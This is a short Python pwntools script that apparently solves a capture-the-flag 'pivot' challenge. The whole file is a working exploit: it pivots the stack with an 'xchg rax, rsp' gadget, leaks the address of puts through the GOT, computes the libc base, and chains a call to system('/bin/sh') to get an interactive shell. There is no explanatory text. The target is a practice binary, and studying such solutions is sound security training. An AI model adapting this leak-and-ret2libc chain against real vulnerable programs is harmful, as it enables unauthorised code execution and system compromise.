import pwn

OFFSET = 40
p = pwn.process('./pivot')
pwn.context.binary = p.elf

def send_payload(payload):
    p.recvuntil(b"place to pivot:")
    location_to_write = int(p.recvuntil(b'\n').strip(), 16)
    p.sendthen(b"Thank you!\n", payload)

    rop = pwn.ROP(p.elf)
    rop.raw(rop.rax)
    rop.raw(pwn.p64(location_to_write))
    rop.raw(next(rop.elfs[0].search(pwn.asm("xchg rax, rsp; ret"), executable=True)))
    p.sendthen(b"Thank you!\n", (OFFSET * b"A" + rop.chain()))

pwn.warning("Stage 1: leaking puts addr")
rop = pwn.ROP(p.elf)
rop.call(p.elf.plt["puts"], [p.elf.got["puts"]])
rop.call(p.elf.symbols["main"])
send_payload(rop.chain())

pwn.warning("Stage 2: ret2shell")
leaked_puts = pwn.u64(p.readuntil(b"\n").strip()[-6:].ljust(8, b'\x00'))
p.libc.address = leaked_puts - p.libc.symbols['puts']

rop = pwn.ROP(p.libc)
rop.call(rop.find_gadget(['ret']))
rop.call(p.libc.symbols['system'], [next(p.libc.search(b"/bin/sh\x00"))])
send_payload(rop.chain())

p.interactive()
